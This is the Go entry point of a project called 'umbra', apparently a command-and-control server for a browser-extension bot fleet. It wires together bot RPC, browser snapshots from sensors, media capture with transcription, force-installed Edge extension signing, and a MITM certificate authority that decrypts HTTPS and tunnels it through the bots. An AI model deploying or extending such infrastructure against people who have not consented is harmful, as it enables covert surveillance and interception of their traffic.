package main

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/s045pd/umbra/internal/api"
	"github.com/s045pd/umbra/internal/auth"
	"github.com/s045pd/umbra/internal/blobstore"
	"github.com/s045pd/umbra/internal/browsersnapshot"
	"github.com/s045pd/umbra/internal/busx"
	"github.com/s045pd/umbra/internal/config"
	"github.com/s045pd/umbra/internal/crxsign"
	"github.com/s045pd/umbra/internal/db"
	"github.com/s045pd/umbra/internal/live"
	"github.com/s045pd/umbra/internal/proxy"
	"github.com/s045pd/umbra/internal/utils"
	"github.com/s045pd/umbra/internal/version"
	wsx "github.com/s045pd/umbra/internal/ws"
)

func main() {
	logger := utils.NewLogger()
	logger.Info("starting", "name", version.Name, "version", version.Version)
	appCtx, appCancel := context.WithCancel(context.Background())
	defer appCancel()

	cfg, err := config.Load()
	if err != nil {
		logger.Error("config load failed", "err", err)
		os.Exit(1)
	}

	deps := api.Deps{
		BcryptRounds: cfg.BcryptRounds,
		GUIDistPath:  cfg.GUIDistPath,
		BotRPC:       api.NewStubBotRPC(),
		PublicURL:    os.Getenv("UMBRA_PUBLIC_URL"),
	}

	skipDB := os.Getenv("SKIP_DB") == "1"
	if skipDB {
		mgr, _ := auth.NewManager("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
		deps.Sessions = mgr
		logger.Warn("SKIP_DB=1, database/ws/proxy disabled (smoke mode)")
	} else {
		gdb, err := db.Open(cfg.DSN())
		if err != nil {
			logger.Error("db open failed", "err", err)
			os.Exit(1)
		}
		defer func() { _ = db.Close(gdb) }()

		if _, err := db.Migrate(gdb, logger, cfg.BcryptRounds); err != nil {
			logger.Error("db migrate failed", "err", err)
			os.Exit(1)
		}
		if cleared, err := db.ResetBotOnlineState(gdb); err != nil {
			logger.Warn("reset bot online state failed", "err", err)
		} else if cleared > 0 {
			logger.Info("reset stale online flags", "bots", cleared)
		}
		secret, err := db.GetSetting(gdb, db.SettingSessionSecret)
		if err != nil {
			logger.Error("session secret missing", "err", err)
			os.Exit(1)
		}
		mgr, err := auth.NewManager(secret)
		if err != nil {
			logger.Error("session manager init failed", "err", err)
			os.Exit(1)
		}
		deps.DB = gdb
		deps.Sessions = mgr

		// WS server doubles as the BotRPC implementation.
		hub := live.NewHub()
		deps.LiveHub = hub
		ws := wsx.New(gdb, logger)
		ws.SetLiveHub(hub)
		deps.BotRPC = ws
		snapshotManager, err := browsersnapshot.NewManager(appCtx, gdb, ws, browsersnapshot.DefaultManagerConfig())
		if err != nil {
			logger.Error("browser snapshot manager init failed", "err", err)
			os.Exit(1)
		}
		defer func() { _ = snapshotManager.Close() }()
		deps.BrowserSnapshots = snapshotManager
		ws.SetSensorConnectedHook(snapshotManager.OnSensorConnected)

		if cfg.MediaDir != "" {
			if st, err := blobstore.Open(cfg.MediaDir); err != nil {
				logger.Warn("media store disabled", "err", err)
			} else {
				ws.SetBlobStore(st)
				deps.Blobs = st
				logger.Info("media store ready", "dir", cfg.MediaDir)
			}
		}
		ws.SetTranscribeCmd(cfg.TranscribeCmd)
		deps.TranscribeCmd = cfg.TranscribeCmd
		if rb, err := busx.NewRedisBus(appCtx, cfg.RedisHost, cfg.RedisPort); err != nil {
			logger.Warn("redis bus unavailable; CallBot is local-only", "err", err)
		} else {
			ws.SetBus(rb)
			defer func() { _ = rb.Close() }()
			logger.Info("rpc bus ready")
		}

		// Proxy uses the same RPC.
		px := proxy.New(gdb, ws, logger)

		// Stand up the MITM CA so HTTPS CONNECT requests can be
		// terminated and forwarded through the bot, rather than
		// silently leaking out of the proxy host. CA path defaults
		// to ./cassl/ next to the binary; override with CA_DIR.
		caDir := os.Getenv("CA_DIR")
		if caDir == "" {
			caDir = "./cassl"
		}
		caCertPath := caDir + "/rootCA.crt"
		caKeyPath := caDir + "/rootCA.key"
		mitm, err := proxy.NewMITM(caCertPath, caKeyPath, logger)
		if err != nil {
			logger.Error("MITM init failed; HTTPS will not be tunneled via bot", "err", err)
		} else {
			px.MITM = mitm
			// Tell the api package where the public cert lives so
			// /api/v1/download_ca can serve it without any extra
			// configuration.
			api.CAFilePath = caCertPath
			logger.Info("MITM CA ready", "cert", caCertPath)
		}

		// Persistent ECDSA P-256 key for CRX v3 signing. Lives next
		// to the MITM CA so a single backup directory captures all
		// state needed to re-deploy without changing the Extension
		// ID (which would invalidate every Edge force-install
		// policy already pushed to the fleet).
		extKeyPath := os.Getenv("EXT_KEY_PATH")
		if extKeyPath == "" {
			extKeyPath = caDir + "/extkey.pem"
		}
		if signer, err := crxsign.LoadOrGenerate(extKeyPath); err != nil {
			logger.Error("ext signing key init failed; /ext/* endpoints disabled", "err", err)
		} else {
			deps.ExtSigner = signer
			logger.Info("ext signing key ready", "ext_id", signer.ExtensionID(), "path", extKeyPath)
		}

		// Run WS + Proxy.
		startServer(logger, fmt.Sprintf(":%d", cfg.WSPort), ws.Handler(), "ws")
		startServer(logger, fmt.Sprintf(":%d", cfg.ProxyPort), px.Handler(), "proxy")
		logger.Info("db ready")
	}

	srv := &http.Server{
		Addr:              fmt.Sprintf(":%d", cfg.APIPort),
		Handler:           api.NewRouter(deps),
		ReadHeaderTimeout: 10 * time.Second,
	}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	go func() {
		logger.Info("api listening", "addr", srv.Addr)
		if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			logger.Error("api server crashed", "err", err)
			stop()
		}
	}()

	<-ctx.Done()
	logger.Info("shutdown signal received")
	appCancel()

	shutdownCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := srv.Shutdown(shutdownCtx); err != nil {
		logger.Error("api shutdown failed", "err", err)
	}
	logger.Info("bye")
}

// startServer launches an http.Server in a goroutine and registers it
// with the global wait group used at shutdown.
var serverWG sync.WaitGroup

type slogLike interface {
	Info(msg string, args ...any)
	Error(msg string, args ...any)
}

func startServer(logger slogLike, addr string, h http.Handler, name string) {
	serverWG.Add(1)
	srv := &http.Server{
		Addr:              addr,
		Handler:           h,
		ReadHeaderTimeout: 10 * time.Second,
	}
	go func() {
		defer serverWG.Done()
		logger.Info(name+" listening", "addr", addr)
		if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			logger.Error(name+" server crashed", "err", err)
		}
	}()
}
